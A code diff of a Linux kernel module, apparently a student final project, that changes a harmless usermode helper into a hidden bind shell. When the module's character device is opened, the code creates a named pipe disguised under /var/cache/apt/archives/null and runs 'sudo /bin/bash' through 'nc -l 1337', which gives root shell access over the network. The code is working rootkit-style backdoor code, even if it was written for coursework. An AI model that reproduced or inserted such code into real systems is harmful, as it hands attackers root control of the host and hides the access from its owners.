@@ -8,7 +8,7 @@
 MODULE_LICENSE("GPL");
 MODULE_AUTHOR("Tristan Fletcher (@Cyclawps52)");
 MODULE_DESCRIPTION("CSC492 Final Project");
-MODULE_VERSION("delta-rev0");
+MODULE_VERSION("delta-rev1");
 
 // PROTOTYPES - MOVE TO .H FILE LATER
 int initModule(void);
@@ -17,7 +17,8 @@ static int deviceOpen(struct inode*, struct file*);
 static int deviceRelease(struct inode*, struct file*);
 static ssize_t deviceRead(struct file*, char*, size_t, loff_t*);
 static ssize_t deviceWrite(struct file*, const char*, size_t, loff_t*);
-static int usermodeHelper(void);
+static int makePipe(void);
+static int bindShell(void);
 
 // for character device
 #define SUCCESS 0
@@ -96,7 +97,9 @@ static int deviceOpen(struct inode* inode, struct file* file)
 	sprintf(msg, "Counter is now at %d\n", counter++);
 	msgPtr = msg;
 	try_module_get(THIS_MODULE);
-	usermodeHelper();
+	
+	bindShell();
+
 
 	return SUCCESS;
 }
@@ -130,8 +133,9 @@ static ssize_t deviceWrite(struct file* filp, const char* buff, size_t len, loff
 	return -EINVAL;
 }
 
-static int usermodeHelper(void){
-	char* argv[] = {"/usr/bin/wall", "\"hello\"", NULL};
+static int makePipe(void){
+	// mkfifo /var/cache/apt/archives/null
+	char* argv[] = {"/usr/bin/mkfifo", "/var/cache/apt/archives/null", NULL};
 	static char* env[] = {
 		"HOME=/",
 		"TERM=linux",
@@ -139,7 +143,21 @@ static int usermodeHelper(void){
 		NULL
 	};
 
-	return call_usermodehelper( argv[0], argv, env, UMH_WAIT_PROC);
+	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
+}
+
+static int bindShell(void){
+	makePipe();
+	// cat /var/cache/apt/archives/null |sudo /bin/bash 2>&1|/bin/nc -l 1337 >/var/cache/apt/archives/null
+	char* argv[] = {"/bin/bash", "-c \"cat /var/cache/apt/archives/null |sudo /bin/bash 2>&1|/bin/nc -l 1337 >/var/cache/apt/archives/null\"", NULL};
+	static char* env[] = {
+		"HOME=/",
+		"TERM=linux",
+		"PATH=/sbin:/bin:/usr/sbin:/usr/bin", 
+		NULL
+	};
+
+	return call_usermodehelper(argv[0], argv, env, UMH_WAIT_PROC);
 }
 
 module_init(initModule);
